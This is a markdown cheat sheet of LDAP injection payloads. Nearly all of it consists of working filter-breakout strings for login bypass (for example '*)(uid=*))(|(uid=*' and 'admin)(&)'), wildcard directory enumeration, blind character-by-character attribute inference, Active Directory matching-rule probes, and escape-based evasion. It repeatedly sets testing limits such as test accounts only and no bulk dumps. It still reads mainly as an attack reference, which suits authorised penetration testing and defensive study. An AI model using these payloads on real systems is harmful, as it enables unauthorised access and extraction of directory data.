# LDAP injection payloads
# Benign auth bypass / minimal enumeration. Rate-limit wildcard queries. No bulk directory dump.

## Auth bypass (filter breakout)
Typical vulnerable filter: `(&(uid=<USER>)(userPassword=<PASS>))`
```
# username field:
*                              # match any
*)(uid=*))(|(uid=*             # classic breakout -> (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
admin)(&)                      # -> (&(uid=admin)(&))  always-true tail
admin)(|(uid=*                 # OR any
# password field:
*                              # wildcard password
*)(uid=*
```

## Wildcard enumeration
```
# search field:
a*        b*  ...              # enumerate entries by prefix
*)(mail=*                      # pull entries with a mail attribute
*)(objectClass=*               # list object classes
```

## Blind boolean (attribute presence)
Infer a value by whether a filter matches (response differs):
```
admin)(description=secret*)    # true if description starts with 'secret'
admin)(description=secreta*)   # narrow char by char
```

## Metacharacters
`( ) * | & = \ NUL` — LDAP filter special chars. Encode as needed (`\28`=`(`, `\29`=`)`, `\2a`=`*`).

## Detection
Inject `*` or `)(` into a login/search param; a result change (auth success, more/different entries,
filter error) flags LDAP injection. Confirm with a benign auth bypass or minimal enumeration.

---
## Extended arsenal — filter syntax & context model

LDAP filters are prefix-notation and parenthesis-balanced. There is **no comment syntax** — a breakout works by
closing the current clause and appending an always-true (or always-false) clause while keeping parens balanced.

| token | meaning | injection use |
|---|---|---|
| `(&(a)(b))` | AND | both must match — inject a tail to neutralise the 2nd clause |
| `(\|(a)(b))` | OR | any matches — widen by adding `(uid=*)` |
| `(!(a))` | NOT | invert a clause |
| `=` | equality / `attr=val` | `attr=*` = presence; `attr=pre*` = starts-with |
| `~=` | approx match | fuzzy value probe |
| `>=` `<=` | ordering | binary-search a value (no `<`/`>`, use `>=`/`<=`) |
| `*` | wildcard | match-any / substring |
| `\XX` | hex escape | encode a metachar as data (`\28 \29 \2a \5c \00`) |

```
# where injection lands (value position), and how a breakout re-shapes the filter:
#   template:  (&(uid=<INJ>)(userPassword=<PASS>))
#   INJ = *)(uid=*))(|(uid=*   ->  (&(uid=*)(uid=*))(|(uid=*)(userPassword=<PASS>))
#   first balanced filter (&(uid=*)(uid=*)) is always true; many backends evaluate the first -> bypass.
# mechanism note: behaviour is backend-dependent (first-filter vs whole-string). Confirm empirically.
```

---
## Extended arsenal — authentication-bypass matrix

For the common AND filter `(&(uid=<USER>)(userPassword=<PASS>))`. Confirm by landing as a known TEST account;
never pivot into real accounts. `%00` = null byte (only some backends truncate on it).

| field | payload | resulting intent |
|---|---|---|
| username | `*` | match any entry (if password clause is weak/absent) |
| username | `*)(uid=*))(|(uid=*` | classic balanced breakout → always-true first filter |
| username | `admin)(&)` | `(&(uid=admin)(&))` — `(&)` is LDAP "absolute true" tail |
| username | `admin)(|(uid=*` | OR-widen after targeting admin |
| username | `admin*` | prefix-match the admin account |
| username | `admin))%00` | null-truncate the rest of the filter (backend-dependent) |
| password | `*` | wildcard password (matches any stored value under substring match) |
| password | `*)(uid=*` | break the password clause, re-open a true clause |

```
# always-true tails worth knowing:
(&)        # absolute TRUE filter
(|)        # absolute FALSE filter (use to force the negative branch in differentials)
# target a specific test user while neutralising the password predicate:
admin)(cn=*          #  (&(uid=admin)(cn=*)(userPassword=...))  -> matches if cn present
```

---
## Extended arsenal — blind boolean attribute inference

Infer a value by whether the filter matches (response differs: auth success / entry present / count change).
Bounded and benign — confirm a short marker, never walk a password/hash attribute.
```
# presence of an attribute on the targeted entry:
admin)(description=*                 # true if 'description' exists on admin
# starts-with, then narrow char by char:
admin)(description=secret*
admin)(description=secreta*          # extend the prefix one char at a time
# binary-search a value with >= / <= (no '<'/'>' in LDAP) — far fewer requests than linear:
admin)(employeeNumber>=5000
admin)(employeeNumber<=7500          # bracket the number, then converge
# approx match (fuzzy) and existence combine to bound string walks:
admin)(cn~=john
# length-style bound via stacked wildcards (true only if >= N chars between anchors):
admin)(uid=a*b*c*                    # structural probe (benign, structure not content)
```

### Common attribute probes (presence first, then bounded value walk)
| attribute | typical use | probe |
|---|---|---|
| `uid` / `sAMAccountName` | login name | `uid=admin*` |
| `cn` | common name | `cn=adm*` |
| `sn` / `givenName` | surname / first | `sn=sm*` |
| `mail` | email | `mail=*@*` (presence), `mail=admin@*` |
| `memberOf` | group membership | `memberOf=*admin*` (is the entry in an admin-ish group) |
| `objectClass` | entry type | `objectClass=person` / `=user` |
| `description` | free text | `description=*` then prefix-walk |
| `telephoneNumber` | phone | presence only (PII — do not extract) |
| `userAccountControl` | AD account flags | bitwise probe (see directory notes) |
| `userPassword` | credential | **presence only** — never infer the value |

Keep inferences minimal: confirm the oracle works and read a short, non-sensitive marker. No PII extraction.

---
## Extended arsenal — wildcard enumeration (bounded)

Prove over-broad search is possible — do NOT dump the directory. Cap breadth: a few targeted prefixes, a
size-limit, a handful of entries to demonstrate the flaw, then stop.
```
# prefix enumeration (bounded — sample, don't sweep the whole alphabet):
a*   b*   c*                         # a few prefixes to show entries leak, not all 26+
# pull entries that carry a given attribute (bounded):
*)(mail=*                            # entries with an email
*)(objectClass=*                     # entry types present (schema shape)
# structural probe without content:
*)(uid=a*                            # how many uids start with 'a' (count differential, not values)
```
Bounding rules: set a client-side result cap, target specific prefixes/attributes, collect only enough entries
to evidence the finding. Mass directory dumps are out of scope.

---
## Extended arsenal — AND vs OR context exploitation

The surrounding boolean operator decides the breakout.
```
# AND context  (&(uid=<INJ>)(userPassword=<PASS>)) — neutralise the 2nd clause:
#   append an always-true clause and re-balance:
*)(uid=*))(&(uid=*                   # close, inject true clause, keep parens valid
admin)(&)                            # (&(uid=admin)(&)) absolute-true tail (backend-dependent)
# OR context  (|(uid=<INJ>)(cn=<INJ>)) — just widen it:
*                                    # one wildcard already matches everything
*)(objectClass=*                     # add a broad clause
# NOT context  (!(uid=<INJ>)) — flip the intended exclusion:
*)(uid=target                        # turn an exclusion into an inclusion of 'target'
# differential helper: (&) = always true, (|) = always false — use both to confirm the branch you control.
```

---
## Extended arsenal — directory-specific notes (AD vs OpenLDAP)

```
# Active Directory attribute names differ from OpenLDAP's posix schema:
sAMAccountName   userPrincipalName   distinguishedName   memberOf   objectCategory   userAccountControl
#   login probes:  sAMAccountName=admin*     userPrincipalName=admin@*
# userAccountControl bitwise flags (benign presence/flag probe via matching rule 1.2.840.113556.1.4.803):
userAccountControl:1.2.840.113556.1.4.803:=2       # ACCOUNTDISABLE bit set?
userAccountControl:1.2.840.113556.1.4.803:=65536   # DONT_EXPIRE_PASSWORD bit set?
# recursive group matching rule (LDAP_MATCHING_RULE_IN_CHAIN) — EXPENSIVE, use bounded:
memberOf:1.2.840.113556.1.4.1941:=<group-DN>       # is entry (transitively) in group — keep targeted, not swept
# OpenLDAP posix schema: uid, cn, gidNumber, uidNumber, homeDirectory, objectClass=posixAccount
```
AD search behaviour and size-limits differ from OpenLDAP — confirm the breakout empirically and respect the
server's size/time limits (don't force unbounded recursive matches).

---
## Extended arsenal — metacharacter encoding & evasion

```
# LDAP filter special chars and their hex escapes (RFC 4515):
(  -> \28      )  -> \29      *  -> \2a      \  -> \5c      NUL -> \00
# when the app escapes YOUR input, the injection fails — test whether '(' ')' '*' survive un-escaped first.
# when a specific metachar is filtered but you need it as DATA (not syntax), send the escape form:
#   search for a literal '*' in a value:   attr=\2a
# space / case: attribute names are case-insensitive; filters ignore insignificant whitespace in some stacks.
# double-decoding: if a proxy/app URL-decodes twice, %255c -> %5c -> '\' etc. — test for it.
# no comments in LDAP: you cannot "comment out" the tail — always balance parens or use %00 truncation.
```

---
## Extended arsenal — detection & benign confirmation

```
# differentials that flag LDAP injection:
inject '*'     -> more/all entries returned (vs a specific value)
inject ')('    -> filter-parse error or changed result set
inject '(&)' / '(|)' on a boolean branch -> flips match/no-match predictably
# confirm safely:
#   auth context -> land as a KNOWN TEST account (not a real user)
#   search context -> show a BOUNDED over-broad result (a few extra entries), not a full dump
# don't rely on a 500 alone — it may be app logic; pair it with a controlled true/false differential.
```
No bulk directory dump, rate-limit wildcard/recursive queries, and keep every proof to the minimum that
evidences the finding.
